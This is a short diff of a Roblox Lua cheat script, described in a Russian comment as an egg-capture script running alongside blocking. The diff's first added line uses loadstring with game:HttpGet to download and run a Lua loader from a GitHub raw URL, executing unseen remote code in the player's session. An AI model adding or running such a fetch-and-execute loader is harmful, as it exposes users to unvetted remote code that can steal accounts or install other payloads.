@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
 -- ===== СКРИПТ ЗАХВАТА ЯЙЦА (РАБОТАЕТ ПАРАЛЛЕЛЬНО С БЛОКИРОВКОЙ) =====
 local player = game.Players.LocalPlayer
 local playerName = player.Name
